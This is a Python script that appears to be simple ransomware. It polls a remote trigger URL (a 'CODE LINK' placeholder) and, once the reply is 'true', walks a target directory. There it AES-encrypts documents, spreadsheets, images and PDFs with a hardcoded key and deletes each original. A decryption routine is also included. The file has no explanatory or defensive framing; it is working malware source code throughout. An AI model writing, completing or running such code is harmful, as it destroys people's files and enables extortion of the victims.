import os
import base64
import hashlib
import io
import re
import requests
import struct
import time
from Crypto.Cipher import AES #pycrypto
from Crypto.Hash import SHA256 as SHA
from Crypto import Random

MAIN_PATH="DIR_PATH"

def encrypt(password):
    hash = SHA.new()
    hash.update(password.encode('utf-8'))
    key = hash.digest()
    key = key[:16]
    return key
    
def get_file_paths(folder_path):
    file_paths = []
    for root, directories, files in os.walk(folder_path):
        for file in files:
            if re.match(r'^.*\.(txt|doc|docx|xls|xlsx|ppt|pptx|jpg|png|csv|psd|pdf)$', file):
                file_paths.append(os.path.join(root, file))
    return file_paths
     
def encrypt_file(filename, blocksize=1024):
    password = encrypt("ABCD")
    passdir = (r'.')
    with open(passdir+'\\data.encrypted', 'w') as f:
        f.write(password.hex())
    iv = bytes([0x00] * 16)[:16]
    aes = AES.new(password, AES.MODE_CBC, iv)
    filesize = os.path.getsize(filename)
    out_filename = filename+'.encrypted'
    with open(filename, 'rb') as origin:
        with open(out_filename, 'wb') as ret:
            ret.write(struct.pack('<Q', filesize))
            while True:
                block = origin.read(blocksize)
                if len(block) == 0:
                    break
                elif len(block) % 16 != 0:
                    block += b'0'*(16 - len(block) % 16)
                ret.write(aes.encrypt(block))
    os.remove(filename)

def decrypt_aes_file(filename, blocksize = 1024):
    iv = bytes([0x00] * 16)[:16]
    password = encrypt("ABCD")
    with open(filename, 'rb') as origin:
        filesize = struct.unpack('<Q', origin.read(struct.calcsize('<Q')))[0]
        aes = AES.new(password, AES.MODE_CBC, iv)
        filename = filename.replace(".encrypted","")
        with open(filename, 'wb') as ret:
            ret.write(aes.decrypt(origin.read(16)))
            while True:
                block = origin.read(blocksize)
                if len(block) == 0:
                    break
                ret.write(aes.decrypt(block))
            ret.truncate(filesize)
                
def decrypt_file(folder_path, blocksize = 1024):
    for root, directories, files in os.walk(folder_path):
        for file in files:
            if re.match(r'^.*\.(encrypted)$', file):
                with open(os.path.join(root, file), 'r') as f:
                    decrypt_aes_file(os.path.join(root, file), blocksize)
                os.remove(os.path.join(root, file))
def main():
    while True:
        response = requests.get('CODE LINK')
        if response.text == 'true':
            try:
                for root, directories, files in os.walk(MAIN_PATH):
                    for file in files:
                        if re.match(r'^.*\.(txt|doc|docx|xls|xlsx|ppt|pptx|jpg|png|csv|psd|pdf)$', file):
                            try:
                                encrypt_file(os.path.join(root, file),1024)
                                #print(os.path.join(root, file))
                            except:
                                print("82Line Error")
            except:
                print("84Line Error")
            break
        time.sleep(1)
        print("Wait...")

if __name__ == '__main__':
    main()
